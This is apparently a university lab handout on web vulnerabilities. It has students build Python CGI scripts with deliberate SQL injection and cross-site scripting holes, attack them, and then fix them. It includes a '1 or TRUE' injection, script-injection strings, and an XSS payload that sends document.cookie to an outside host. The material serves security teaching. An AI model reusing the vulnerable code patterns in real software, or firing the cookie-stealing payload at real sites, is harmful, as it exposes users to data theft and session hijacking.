#+STARTUP: showall
#+STARTUP: lognotestate
#+TAGS:
#+SEQ_TODO: TODO STARTED DONE DEFERRED CANCELLED | WAITING DELEGATED APPT
#+DRAWERS: HIDDEN STATE
#+TITLE: Web vulnerabilities
#+CATEGORY: todo


* Web vulnerabilities

This week we will continue on Web vulnerabilities. I know that many of you did not complete Lab06. So this lab will replace the last part of that lab.

* CGI scripting

CGI-Scripting is the simplest way to create functionality in a webserver. Any more complex technology (such as Ruby on Rails) is based on CGI.

Read about CGI here: http://www.tutorialspoint.com/python/python_cgi_programming.htm

There are two ways for a client to send information to a CGI-script: one of them is POST and the other GET. Go back to the URL above and make sure you
understand what POST and GET are used for. For example, go to amazon.ca and search for a product. Does Amazon search use GET or POST? What about google.ca?

* Setup

For this lab we will need to use the machine roberts.seng.uvic.ca. Login in to it. In this machine go to the directory =/web/seng360/=. In here there should be
a directory with your username (for example, in my case, there is one called =/web/seng360/dmg/=.

Let us make sure things work. First create a file called =test.html= in this directory (i.e. =/web/seng360/<youruserid>/test.html=) that contains the following:


#+begin_example
<H1>Test</h1>

This is a test.
#+end_example

This has created a web page that should be found at: http://roberts.seng.uvic.ca/seng360/userid/test.html (replace userid with your userid).

If things are working properly, you  should be browsing the contents of this page.

It will be a good idea to monitor the error logs of the web server in case your Web pages or scripts do not work. They are located in the =roberts.seng.uvic.ca=
in directory =/web/seng360/logs/error_log=. In my opinion the easiest way to do this is by opening a window to =roberts= and executing:

#+begin_example
tail -f /web/seng360/logs/error_log 
#+end_example



* Part 1: SQL

** Creating =sqlForm.html=


First we need to create a Web form. This will gather information that will passed to our script. Read about HTML forms here: http://zipcon.net/~swhite/docs/computers/web/QuickHTML/Forms.html

Create a file called =sqlForm.html=

#+begin_src html
<h1>This a form to test our SQL script</h1>

<h3>This is a GET form</h3>
<form action="sql.py" method="get">
id: <input type="text" name="id"><br>
<input type="submit" value="Submit">
</form>

<h3>This is a POST form</h3>

<form action="sql.py" method="post">
id: <input type="text" name="id"><br>
<input type="submit" value="Submit">
</form>


#+end_src

Test it. Its url is http://roberts.seng.uvic.ca/seng360/userid/sqlForm.html (replace userid with your userid).

It should look something like this:

[[./sqlForm.png]]


** The Python script

We will now create the CGI script that responds to this form.

I have setup a mysql database in one of my computers. The Lab instructor will give you the details (hostname, username and password). Create a Python CGI-script
called =sql.py= with the following contents:

#+begin_src python
#!/usr/bin/python

import MySQLdb
import cgi, cgitb 


print "Content-type: text/html"
print ""

hostname="askLabInstructor"
username="seng360"
passwd = "askLabInstructor"
# Open database connection

try:
   db = MySQLdb.connect(hostname,username,passwd,"seng360" )
except:
   print "<h1>Unable to connect to database</h1>"
   exit

# Create instance of FieldStorage 
form = cgi.FieldStorage() 

if "id" not in form:
    print "<H1>Error please use the form and</H1>"
    print "Please fill in the <b>id</b> field."
    exit


id = form.getvalue('id')

# prepare a cursor object using cursor() method
cursor = db.cursor()

# Prepare SQL query to INSERT a record into the database.
sql = "SELECT id, field from test where id = "  + id




print "<h3>query to evaluate: "+sql + "</h3>"

try:

   # Execute the SQL command
   cursor.execute(sql)
   # Fetch all the rows in a list of lists.
   results = cursor.fetchall()

   print "<h3>Results for </h3>"
   print "<table border = 1>"
   for row in results:
      id = row[0]
      field = row[1]
      print "<tr><td>id=%d</td><td>field=%d</td></tr>" % \
          (id,field)
   print "</table>"

except:
   print "<h1>Error: unable to fetch data for id = [" + id + "]</h1>"


#+end_src


** Test the script

Load =sqlForm.html= again in your browser. Test  it with any of the following values: 1,5,10. Try both forms. Answer the following questions:

*Q1: What is the difference between using a POST and GET form to call a CGI-script* 

and

*Q2: Is one form more secure than the other? Explain*  (hint, look at the URL of the script)

*Q3: Is it really more secure? Explain*


** Do the injection attack

Reload the form. Use  the following as the value for id:

#+begin_src
1 or TRUE
#+end_src

As you can see, we now get all the values in the table. 

*Q4: Explain why the new value of /id/ tricks our form and is able to retrieve all the tuples in the table.*

** Fix the script

Injection attacks are common in SQL, hence libraries have learned to deal with them. Learn how to address it. In general the best method is using prepared
statements. The Python-MySQL library we are using does not support prepared statements, but it is capable of dealing with this problem. See this question in
Stack Overflow: http://stackoverflow.com/questions/7929364/python-best-practice-and-securest-to-connect-to-mysql-and-execute-queries

Fix your script. Test your script until the attack is no longer effective.

* Part 2: Cross-scripting attacks

Cross-scripting attacks are another common way to Web applications.

For this part of the assignment make sure that you use *Firefox*.

** Create another form

Create a Web page called =formXSS.html= with the following contents:

#+begin_src html
<h1>Cross scripting attack</h1>

This form will help us test cross-scripting attacks.

<form action="xssSimple.py" method="get">
User: <input type="text" name="user"><br>
<input type="hidden" name="notshown" value="abc"><br>
<input type="submit" value="Submit">
</form>
#+end_src

Test it.

** Create the script that will respond to this form

Create a script =xssSimple.py= that will respond to the form. Its contents should be:

#+begin_src python
#!/usr/bin/python

import cgi, cgitb 

print "Content-type: text/html"
print ""

# Create instance of FieldStorage 
form = cgi.FieldStorage() 
user = form.getvalue('user')

if "user" not in form:
    print "<H1>Error</H1>"
    print "Please fill in the <b>user</b> field."
    exit

print "<h1>Example of Simple Cross Scripting attack</h3>"
print "Hello [" + user + "]"
#+end_src

** Test the script

Test the script by submitting a value in the field =user= and submitting the form.

** A simple attack

In the form, submit the following (in the field =user=)

#+begin_src
<font color=red><b>dmg</b></font>
#+end_src

then try this:

#+begin_src
<h1>dmg</h1>
#+end_src

*Q5: Explain the impact of the attack and how it works*

** A more active attack

Are you using *Firefox*? If not, then use it. This next attack requires Firefox.

Input the following value in the /user/ field and hit submit again:

#+begin_src
<script>alert('attacked');</script>
#+end_src

** Stealing cookies

Create a script that sets a cookie. Call this script =cookies.py=

#+begin_src python
#!/usr/bin/env python

import cgi, cgitb 

import time, Cookie

# Instantiate a SimpleCookie object
cookie = Cookie.SimpleCookie()

# The SimpleCookie instance is a mapping
cookie['seng360'] = str(time.time())

# Output the HTTP message containing the cookie
#print cookie
print 'Content-Type: text/html\n'

# Create instance of FieldStorage 
form = cgi.FieldStorage() 
user = form.getvalue('user')

if "user" not in form:
    print "No <b>user</b> field has been set."
else:
   print "<h3>Hello [" + user + "]"
   print "</h3>"


print '<br><hr>'
print 'Server time is', time.asctime(time.localtime())
print '</body></html>'
#+end_src

Load the script. Now inspect the cookies in your browser to make sure the cookie was set. (In Firefox you can find the cookies in
/Preferences/Privacy/History/Remove Individual Cookies/ Make sure the cookie was set.

Let us create another web page to test it. This time we will call it =cookies.html=

#+begin_src html
<h1>Cross scripting attack</h1>

This form will help us test cross-scripting attacks.

<form action="cookies.py" method="get">
User: <input type="text" name="user"><br>
<input type="hidden" name="notshown" value="abc"><br>
<input type="submit" value="Submit">
</form>
#+end_src

Test it. It should behave as expected

** Stealing the cookie

Now pass the following string in the user field:

#+begin_example
<a href="cookies.py" onClick="javascript:document.location.replace('http://turingmachine.org/text' + escape(document.cookie)); return false;">my name</a>
#+end_example

As you can see, the location where the /Name/ should be displayed is now replaced with a link. Follow it. Look at the resulting URL. This URL does not exist,
but inspect the URL that you were trying to retrieve.

*Q6: What URL is displayed when the mouse is hovered over the link?*

*Q7: What is the full URL that is actually the link is followed? Why is this an attack?*

This attack is very pernicious. It is capable of stealing all the cookies of a site by simply logging the access to the destination Website.

* Part3 Cross-scripting attacks using Chromium

Try the same attacks on Chromium.

*Q8: Which of the attacks did not succeed when using Chromium? Why?*

* Part 4 Fix the vulnerability of Part 2 and Part 3

Fix the vulnerabilities in your scripts. Hint: see /cgi.escape/ in https://docs.python.org/2/library/cgi.html

* What to submit

Submit a zip file that contains:

- Your scripts
- Your HTML
- Your Answers


